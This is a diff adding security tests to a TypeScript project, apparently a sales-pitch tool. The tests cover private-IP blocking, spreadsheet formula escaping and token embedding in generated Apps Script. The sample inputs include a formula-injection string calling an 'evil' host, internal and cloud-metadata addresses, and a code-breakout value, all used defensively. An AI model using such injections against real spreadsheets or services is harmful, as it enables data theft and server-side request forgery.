@@ -4,6 +4,29 @@ import { detectSegment } from "../src/lib/domain/segments";
 import { bannedIn, buildPitch, contactLinks, nextFollowUpAt } from "../src/lib/domain/pitch";
 import { mergeSettings } from "../src/lib/domain/settings";
 import { dayBounds } from "../src/lib/domain/time";
+import { isPrivateIp } from "../src/lib/domain/ip";
+import { sheetSafe } from "../src/lib/domain/sheet-safe";
+import { appsScript } from "../src/lib/domain/apps-script";
+
+describe("безопасность исходящих данных", () => {
+  it("внутренние адреса не проходят, публичные проходят", () => {
+    for (const ip of ["127.0.0.1", "10.1.2.3", "172.20.0.5", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fd00::1", "fe80::1", "::ffff:127.0.0.1", "::ffff:7f00:1"]) expect(isPrivateIp(ip), ip).toBe(true);
+    for (const ip of ["8.8.8.8", "93.184.216.34", "2606:4700::1111"]) expect(isPrivateIp(ip), ip).toBe(false);
+  });
+  it("формулы из чужих данных экранируются", () => {
+    expect(sheetSafe('=IMPORTXML("https://evil";"//a")')).toBe('\'=IMPORTXML("https://evil";"//a")');
+    expect(sheetSafe("+7 999")).toBe("'+7 999");
+    expect(sheetSafe("Суши Мастер")).toBe("Суши Мастер");
+    expect(sheetSafe(146)).toBe(146);
+  });
+  it("код Apps Script получает токен и экранирует значения сам", () => {
+    const code = appsScript("abc123def456ghi789jkl012");
+    expect(code).toContain('var TOKEN = "abc123def456ghi789jkl012";');
+    expect(code).toContain("function safe(v)");
+    expect(code).not.toContain("__TOKEN__");
+    expect(appsScript('x"; evil(); "')).toContain('var TOKEN = "xevil";');
+  });
+});
 import { SCENARIOS, checklistFrom, scenarioOf } from "../src/lib/domain/scenarios";
 import { SEGMENTS } from "../src/lib/domain/segments";
 
